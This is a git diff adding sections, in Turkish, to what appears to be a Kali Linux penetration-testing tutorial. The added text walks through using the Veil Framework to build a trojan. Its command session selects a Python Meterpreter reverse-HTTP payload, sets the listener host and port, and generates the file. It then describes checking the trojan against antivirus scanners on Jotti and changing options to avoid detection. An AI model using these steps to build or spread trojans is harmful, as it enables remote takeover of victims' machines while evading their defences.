@@ -77,6 +77,8 @@
   - [Msfconsole](#msfconsole)
 - [Kullanıcılara Saldırmak](#kullanıcılara-saldırmak)
   - [Veil](#veil)
+    - [Trojan Oluşturmak](#trojan-oluşturmak)
+    - [Anti-Virüslere Yakalanmamak](#anti-virüslere-yakalanmamak)
 
 # Giriş
 Bu döküman **Linux** işletim sisteminin **Kali Linux** dağıtımı üzerinde hazırlanmıştır. İlgili sistem bilgileri aşağıda bulunmaktadır.<br>
@@ -862,8 +864,35 @@ Sistemlerde açık bulamadığımız zaman direkt olarak kullanıcılara **Troja
 ## Veil
 [Veil Framework](https://github.com/Veil-Framework/Veil) bizim için trojan oluşturmamızı sağlayan bir tool'dur. Kurulumu basit bir şekilde kendi dökümantasyonunu kullanarak yapabiliriz. Kurulumu başarılı bir şekilde yaptıysak konsolda `veil` komutu ile Veil Framework'u çalıştırabiliriz.
 - `list` ile kullanılabilir araçları listeleyebiliriz
-- `use <tool_number>` ile kullanmak istediğimiz araca geçiş yapabiliriz
+- `use <tool_number>` ile kullanmak istediğimiz araca geçiş yapabiliriz ve `list` ile o araçtaki Trojanları listeleyebiliriz
 - `back` ile önceki sayfaya geçebiliriz
 
 ![Veil Intro](./assets/25-veil-intro.png)
+
+### Trojan Oluşturmak
+```
+# veil  # veil'i açtık
+Veil>: use 1  # 1. aracı seçtik
+Veil/Evasion>: list # araçtaki trojanları listeledik
+Veil/Evasion>: use 26 # 26 numaralı trojanı seçtik
+
+[python/meterpreter/rev_http>>]: set LHOST 192.168.1.87 # LHOST değişkenini set ediyoruz, kendi IP adresimiz
+[python/meterpreter/rev_http>>]: set LPORT 8080
+
+[python/meterpreter/rev_http>>]: generate # Trojan'ı oluşturuyoruz, bize çıktı olarak nereye oluşturduğunu verecektir
+```
+![Veil Generate](./assets/26-veil-generate.png)
+
+Oluşturduğumuz Trojan dosyasını Veil'in bize gösterdiği path (dizin) altında bulabiliriz
+
+![Veil Generated File](./assets/27-veil-generated-file.png)
+
+### Anti-Virüslere Yakalanmamak
+Oluşturduğumuz Trojanların anti-virüs programları tarafından yakalanıp yakalanmadığını test edebilmek için [Jotti](https://virusscan.jotti.org/) vb. platformları kullanabiliriz
+
+![Jotti Intro](./assets/28-jotti-intro.png)
+
+Oluşturduğumuz Trojanlar'ın **option** seçeneklerini değiştirmek yakalanma şansımızı azaltacaktır
+
+![Veil Generated Lucky](./assets/29-veil-generated.png)
 
